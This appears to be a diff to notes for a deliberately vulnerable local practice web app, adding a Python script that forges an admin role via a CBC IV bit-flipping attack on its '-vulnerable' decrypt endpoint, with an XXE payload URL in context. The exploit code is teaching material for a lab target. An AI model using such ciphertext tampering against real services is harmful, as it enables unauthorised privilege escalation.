@@ -81,14 +81,44 @@ http://127.0.0.1:8080/xml-vulnerable?xml=%3C%21DOCTYPE%20root%20%5B%3C%21ENTITY%
 
 https://www.nccgroup.com/us/research-blog/cryptopals-exploiting-cbc-padding-oracles/
 
-#### admin
-curl -X POST http://127.0.0.1:8080/encrypt-vulnerable -d "data=YWRtaW4="         
+```python
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+import base64
+import requests
 
-curl -X POST http://127.0.0.1:8080/decrypt-vulnerable -d "data=6gnwywMp22o5Hwtu6cVd4Q=="
 
-curl -X POST http://127.0.0.1:8080/encrypt -d "data=YWRtaW4="
+url = "http://127.0.0.1:8080"
 
-curl -X POST http://127.0.0.1:8080/decrypt -d "data=lVJrUD21AiZ53VikvCrCfDZhYIqZWdlgnO6RtlTufBLqCfDLAynbajkfC27pxV3h"
 
-####  role=admin
-curl -X POST http://127.0.0.1:8080/encrypt-vulnerable -d "data=cm9sZT1hZG1pbg=="
+def exploit():
+    s = requests.Session()
+    r = s.post(url + "/encrypt-vulnerable",
+               data={"data": base64.b64encode(b"role=bdmin")})
+    base64_bdmin_ciphertext_with_iv = r.json()["ciphertext"]
+    raw_bdmin_ciphertext_with_iv = base64.b64decode(base64_bdmin_ciphertext_with_iv)
+    iv = raw_bdmin_ciphertext_with_iv[0: 16]
+    bdmin_ciphertext = raw_bdmin_ciphertext_with_iv[16:]
+
+    # role=admin
+    # 012345
+    iv_list = list(iv)
+    iv_list[5] = ord('a') ^ ord('b') ^ iv_list[5]
+
+    payload = b""
+    for _ in iv_list:
+        payload += bytes.fromhex(format(_, '02x'))
+    payload += bdmin_ciphertext
+
+    r = s.post(url + "/decrypt-vulnerable",
+               data={"data": base64_bdmin_ciphertext_with_iv})
+    print(f"decrypted: {base64.b64decode(r.json()["plaintext"])}")
+
+    r = s.post(url + "/decrypt-vulnerable",
+               data={"data": base64.b64encode(payload)})
+    print(f"exploited: {r.json()["plaintext"]}")
+
+
+if __name__ == "__main__":
+    exploit()
+```
